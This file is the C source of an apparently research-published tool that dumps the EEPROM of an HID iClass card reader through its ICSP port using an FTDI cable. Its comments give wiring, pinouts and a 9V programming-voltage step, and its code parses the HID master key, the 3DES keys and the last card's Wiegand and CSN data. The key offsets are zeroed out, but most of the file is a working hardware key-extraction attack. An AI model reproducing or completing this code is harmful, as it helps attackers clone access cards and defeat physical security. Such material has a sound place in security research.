// build with  gcc -lftd2xx -o iclass_eeprom_dump-d2xx iclass_eeprom_dump-d2xx.c

/*

	iClass EEPROM Dumper
	by brad.antoniewicz@foundstone.com
 	-------------------------------------------------
	
	Using method described here:
		http://proxclone.com/pdfs/iClass_Key_Extraction.pdf

	A lot of code was borrowed from here:
		http://www.openpcd.org/git-view/iclass-security/tree/pic18-icsp/uMain.cpp

	According to 
	http://www.ftdichip.com/Support/Documents/DataSheets/Cables/DS_TTL-232R_CABLES.pdf

	The FTDI TTL-232R-5V-WE pin out is:

		1 - Black
		2 - Brown
		3 - Red
		4 - Orange
		5 - Yellow 
		6 - Green

	According to
		http://www.openpcd.org/images/HID-iCLASS-security.pdf

	The HID RW300/RW400 ICSP pin out is (on the back under the tape,
	starting from left to right, with the sticker on the bottom):
	
		1 - VSS
		2 - VDD
		3 - VPP/MCLR
		4 - PGD
		5 - PGC
		6 - PGM

	So our pin out will be:

	FTDI COLOR -> HID PIN -> HID ICSP 
	   Black   ->    1    ->    VSS
            Red    ->    2    ->    VDD
            N/A    ->    3    ->    VPP
           Green   ->    4    ->    PGD
           Orange  ->    5    ->    PGC
           Brown   ->    6    ->    PGM

	For VPP we'll use an external 9V battery, just connect
	the VCC (+) on the battery to the VPP location when prompted
	(helps to have a switch) and the GND (-) to VSS

	This uses the FTDI-D2XX drivers. Get them from 
	http://www.ftdichip.com/Drivers/D2XX.htm
	and follow the readme


*/


#define FTDI_GREEN_PIN_4 (1<<2)
#define FTDI_ORANGE_PIN_5 (1<<0)
#define FTDI_BROWN_PIN_6 (1<<3)

#define PIN_PGD (FTDI_GREEN_PIN_4)
#define PIN_PGC (FTDI_ORANGE_PIN_5)	
#define PIN_PGM (FTDI_BROWN_PIN_6)

#define PIN_CLR (PIN_PGM)
#define PIN_PGD_IN (PIN_PGD)	
#define PIN_OUT (PIN_PGC|PIN_CLR|PIN_PGD)

#define PGM_CORE_INST                    0	// 0b0000
#define PGM_TABLAT_OUT                   2	// 0b0010
#define PGM_TABLE_READ                   8	// 0b1000
#define PGM_TABLE_READ_POST_INC          9	// 0b1001
#define PGM_TABLE_READ_POST_DEC         10	// 0b1010
#define PGM_TABLE_READ_PRE_INC          11	// 0b1011
#define PGM_TABLE_WRITE                 12	// 0b1100
#define PGM_TABLE_WRITE_POST_INC2       13	// 0b1101
#define PGM_TABLE_WRITE_POST_INC2_PGM   14	// 0b1110
#define PGM_TABLE_WRITE_PGM             15	// 0b1111

#define BAUD_RATE	1000000	
//#define BAUD_RATE 64000

// Number of registers to read
#define REGS 	1536

// Length of the keys, Master = 8, 3DES = 16 (K1 + K2)
#define KEY_LEN	8

// Offsets (important ones removed in prod)
#define MASTER		0	
#define TDES_K1		0
#define TDES_K2		0
#define LAST_CARD	444
#define LAST_CSN1	393
#define LAST_CSN2	1470

#include <stdio.h>
//#include <ftdi.h>
#include <ftd2xx.h>
#include <stdlib.h>
#include <stdint.h>

FT_HANDLE m_Handle;

void help(char *argv[]) {
	printf("\t-v\tverbose\n");
	printf("\nExample:\n");
	printf("\t%s\n\n", argv[0]);
}

void permute(uint8_t *key, uint8_t *res) {
        int i,x;
        uint8_t p,mask;

        for(i=0;i<KEY_LEN;i++) {
                p=0;
                mask=0x80>>i;
                for(x=0;x<KEY_LEN;x++) {
                        p>>=1;
                        if(key[x] & mask)
                                p|=0x80;
                }
                res[i] = p;
        }
}

void permute_n(uint8_t *key, uint8_t *res) {
        int n=3,i;
        while(n--) {
                permute(key, res);
		for (i=0;i<8;i++)
                        key[i] = res[i];
	
        }

}

void shave(uint8_t *key, uint8_t *res) {
        int i;
        for(i=0;i<8;i++)
                res[i] = key[i] & 0xFE;
}
void shave_and_perm(uint8_t *key, uint8_t *res) {
	int i;
	
	printf("\t\t");
	for(i=0;i<KEY_LEN;i++)
		printf("%02x",key[i]);
	printf(" (parsed)\n");

        permute_n(key,res);
	printf("\t\t");
        for(i=0;i<KEY_LEN;i++)
                printf("%02x",res[i]);
        printf(" (rev. permutated)\n");

        printf("\t\t");
        for(i=0;i<KEY_LEN;i++)
                key[i] = res[i];
        shave(key,res);
        for(i=0;i<KEY_LEN;i++)
                printf("%02x",res[i]);
        printf(" (shaved)\n");
}


int tick_tx(UCHAR tick) {
        int res;
        UCHAR data;
        DWORD count;

	//printf("Writing %02x\n", tick);
	if (!m_Handle)
		return FT_INVALID_HANDLE;
	else if ((res = FT_Write (m_Handle, &tick, sizeof (tick), &count)) != FT_OK)
		return res;
	else
		return FT_Read (m_Handle, &data, sizeof (data), &count);
}

int ICD_Write (UCHAR cmd, USHORT data)
{
  int res, i;
  UCHAR tx[(4 + 16) * 2 + 1], *p, out;
  DWORD count;

  if (!m_Handle)
    return FT_INVALID_HANDLE;

  p = tx;
  // transmit CMD
  for (i = 0; i < 4; i++)
    {
      // keep reset high
      out = PIN_CLR | PIN_PGC;
      // get CMD LSB first
      if (cmd & 1)
	out |= PIN_PGD;
      cmd >>= 1;
      // shift out PGD data + PGC
      *p++ = out;
      // shift out PGD only - no PGC
      *p++ = out ^ PIN_PGC;
    }
  // transmit payload data
  for (i = 0; i < 16; i++)
    {
      // keep reset high + PGC
      out = PIN_CLR | PIN_PGC;
      // get DATA LSB first
      if (data & 1)
	out |= PIN_PGD;
      data >>= 1;
      // shift out PGD data + PGC
      *p++ = out;
      // shift out PGD only - no PGC
      *p++ = out ^ PIN_PGC;
    }
  // all lines to GND except of reset line
  *p++ = PIN_CLR;
//	for (i=0; i<sizeof(tx); i++)
//		printf("Sending %x\n",tx[i]);

  if ((res = FT_Write (m_Handle, &tx, sizeof (tx), &count)) != FT_OK)
    return res;
  else
    return FT_Read (m_Handle, &tx, sizeof (tx), &count);
}


TABLAT_Read (void)
{
  int res, i;
  UCHAR tx[(4 + 16) * 2 + 1], *p, out, cmd;
  DWORD count;

  if (!m_Handle)
    return FT_INVALID_HANDLE;

  p = tx;
  cmd = PGM_TABLAT_OUT;
  // transmit CMD
  for (i = 0; i < (4 + 16); i++)
    {
      // keep reset high
      out = PIN_CLR | PIN_PGC;
      // get CMD LSB first
      if (cmd & 1)
	out |= PIN_PGD;
      cmd >>= 1;
      // shift out PGD data + PGC
      *p++ = out;
      // shift out PGD only - no PGC
      *p++ = out ^ PIN_PGC;
    }
  *p++ = PIN_CLR;

  if ((res = FT_Write (m_Handle, &tx, sizeof (tx), &count)) != FT_OK)
    return res;
//	printf("FT_WRITE failed!\n");
  if ((res = FT_Read (m_Handle, &tx, sizeof (tx), &count)) != FT_OK)
    return res;
//	printf("FT_READ failed!\n");

  out = 0;
  for (i = 0; i < 8; i++) {
    out = (out >> 1) | ((tx[i * 2 + (1 + 2 * 12)] & PIN_PGD_IN) ? 0x80 : 0);
    //out = (out >> 1) | ((tx[i * 2 + (1 + 2 * 12)] & PIN_PGD_IN)) ;
	}
  return out;
}

int main(int argc, char *argv[]) {
	int ret,i=0, verbose=0;
	UCHAR ucMask;
	DWORD count;
	FT_STATUS ftStatus;
	
	uint8_t eeprom_data[REGS], key[8], res[8];
	

	printf("iClass EEPROM Dumper\n");
	printf("brad.antoniewicz@foundstone.com\n");
	printf("------------------------------------------------\n");

	if (argc > 1) {
		if((int)argv[1][1] == 'v')
			verbose = 1;
		else {
			help(argv);
			return -1;
		}
	}
			

	printf("Connecting to FTDI TTL-232R-5V-WE...");	

	if (FT_Open (0, &m_Handle) == FT_OK) {
		
		if ((FT_SetBitMode (m_Handle, PIN_OUT, 0x04) == FT_OK) && (FT_SetBaudRate (m_Handle, 1000000) == FT_OK) && ( tick_tx(0x00) == FT_OK ) ) {
			printf("Connected!!\n");
		} else {
			printf("FAILED!\n");
			FT_Close(m_Handle);
		}
	} else { 
		printf("FAILED! (Could not find device)\n");
		printf("You may have to unload the generic FTDI drivers:\n");
		printf("\trmmod ftdi_sio usbserial\n");
        	return EXIT_FAILURE;
	}

	printf("Checking bitmode...");
	ftStatus = FT_GetBitMode(m_Handle,&ucMask);
	
	if (ftStatus != FT_OK ) {
		printf("Failed!\n");
	} else {
		printf("Success!");
		if (verbose)
			printf(" - 0x%02x\n",ucMask);
		else
			printf("\n");
	}

	/*
		Hold all lines except VDD Low and wait for 
		user to raise VPP manually to 9V
	*/
	printf("\nMake sure at least one card has been read by the reader, then\n");
	printf("connect your FTDI TTL-232R-5V-WE to the reader's ICSP port\n");
	printf("and introduce the VPP power\n\n");
	for(i=20;i>0;i--) {
		printf("\033[K\r");
		printf("Sleeping for %d Seconds while you do so....",i);
		fflush(stdout);
		sleep(1);
	}
	printf("\n\nStarting EEPROM Dump");

	/* 
		This sets FSR0H to 0
	*/
	// Copy 0 to the working register (MOV literal)
	if (verbose)	
		printf("\n\tMOVLW <ADDR>      - Writing PGM_CORE_INST 0x0E00\n");
	ICD_Write(PGM_CORE_INST,0x0E00);

	// Copy working register to FSR0H (MOV WREG)
	if (verbose)
	        printf("\tMOVWF FSR0H       - Writing PGM_CORE_INST 0x6EEA\n");
        ICD_Write(PGM_CORE_INST,0x6EEA);

	/*
		This sets FSR0L to 0, and according to the bottom of
		pg 50 of 39564c.pdf, should increment FSR0H automatically
	*/

	// Copy 0 to working register
	if (verbose)
        	printf("\tMOVLW <ADDR>      - Writing PGM_CORE_INST 0x0E00\n");
        ICD_Write(PGM_CORE_INST,0x0E00 );

	// Copy working register to FSR0L
	if (verbose)
	        printf("\tMOVWF FSR0L       - Writing PGM_CORE_INST 0x6EE9");
        ICD_Write(PGM_CORE_INST,0x6EE9);

	printf("\n\nDumping (takes ~10 seconds)..\n");
	for (i=1; i<REGS; i++) {

		/* 
			This post increments FSR0 
		*/

	        ICD_Write(PGM_CORE_INST,0x50EE);
	        ICD_Write(PGM_CORE_INST,0x6EF5);

		//ret = TABLAT_Read();
		eeprom_data[i] = TABLAT_Read(); 
	}
	printf("Dump Complete!\n\n");
	
	if (verbose) {
	        printf("Full EEPROM Dump:\n");
	        printf("-------------------------------------------------------\n   ");

		for (i=1; i<REGS; i++) {
			printf("%02x ",eeprom_data[i]);
			if (i != 0 && i % 16 == 0)
				printf("\n   ");
		}

		printf("\n-------------------------------------------------------\n\n");
	}

	printf("Parsed Keys:\n");

        printf("\tHID Master:\n");
        for(i=0;i<KEY_LEN;i++) 
		key[i] = eeprom_data[i+MASTER];
	shave_and_perm(key,res);

        printf("\tTDES K1:\n");
        for(i=0;i<KEY_LEN;i++)
                key[i] = eeprom_data[i+TDES_K1];
	shave_and_perm(key,res);

        printf("\tTDES K2:\n");
        for(i=0;i<KEY_LEN;i++)
                key[i] = eeprom_data[i+TDES_K2];
	shave_and_perm(key,res);


	printf("Parsed Last Read Card:\n");
        printf("\tWiegand:\t");
        for(i=0;i<4;i++)
                printf("%02x",eeprom_data[i+LAST_CARD]);
        printf("\n");

        printf("\tFirst 4 of CSN:\t");
        for(i=0;i<4;i++)
                printf("%02x",eeprom_data[i+LAST_CSN1]);
        printf("\n");

        printf("\tFull CSN:\t");
        for(i=0;i<8;i++)
                printf("%02x",eeprom_data[i+LAST_CSN2]);
        printf(" (not always right)\n");


	printf("\n\nAll Done!  - Closing the adapter\n");
	FT_SetBitMode (m_Handle, 0x00, 0x00);
	FT_Close(m_Handle);
	m_Handle = NULL;
	printf("Dont forget to disconnect the FTDI from the reader's ICSP\n");
}


